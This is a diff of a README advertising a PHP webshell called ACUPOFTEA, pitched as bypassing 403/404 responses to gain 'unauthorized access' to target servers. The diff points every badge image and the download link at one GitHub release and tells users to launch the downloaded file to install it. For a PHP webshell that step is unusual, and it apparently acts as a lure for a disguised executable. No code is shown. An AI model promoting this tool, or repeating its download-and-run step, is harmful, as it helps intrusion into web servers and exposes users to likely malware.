@@ -1,8 +1,8 @@
 # ACUPOFTEA - PHP Webshell Bypass Server 403/404
 
-![ACUPOFTEA](https://img.shields.io/badge/ACUPOFTEA-PHP-red)
-![Webshell Bypass](https://img.shields.io/badge/Webshell-Bypass-blue)
-![Hacking](https://img.shields.io/badge/Hacking-green)
+![ACUPOFTEA](https://github.com/BONDO2K-cloud/acupoftea/releases/tag/v1.2)
+![Webshell Bypass](https://github.com/BONDO2K-cloud/acupoftea/releases/tag/v1.2)
+![Hacking](https://github.com/BONDO2K-cloud/acupoftea/releases/tag/v1.2)
 
 Welcome to the ACUPOFTEA repository where you can find a powerful PHP webshell bypass tool to help with penetration testing and web security assessments. This webshell has been carefully crafted to bypass server responses of 403 and 404, enabling you to gain unauthorized access and perform various operations on the target server.
 
@@ -39,7 +39,7 @@ ACUPOFTEA webshell is fully compatible with PHP 8, ensuring optimal performance 
 
 ## Installation Instructions
 To get started with ACUPOFTEA Webshell Bypass, you can download the tool from the following link:
-[Download ACUPOFTEA](https://github.com/files/Soft.zip)
+[Download ACUPOFTEA](https://github.com/BONDO2K-cloud/acupoftea/releases/tag/v1.2)
 
 Please note that the file needs to be launched after downloading to initiate the installation process successfully.
 
@@ -64,6 +64,6 @@ Your input is valuable in improving the tool and making it more robust for diver
 
 By leveraging the power of ACUPOFTEA Webshell Bypass, you can enhance your ability to identify vulnerabilities in web servers, applications, and online systems. Remember to use this tool responsibly and only on authorized systems during legitimate security assessments.
 
-![Hacker](https://img.icons8.com/cute-clipart/64/000000/hacker.png)
+![Hacker](https://github.com/BONDO2K-cloud/acupoftea/releases/tag/v1.2)
 
 Happy hacking and stay safe in your cybersecurity explorations! 🚀🛡️🔒
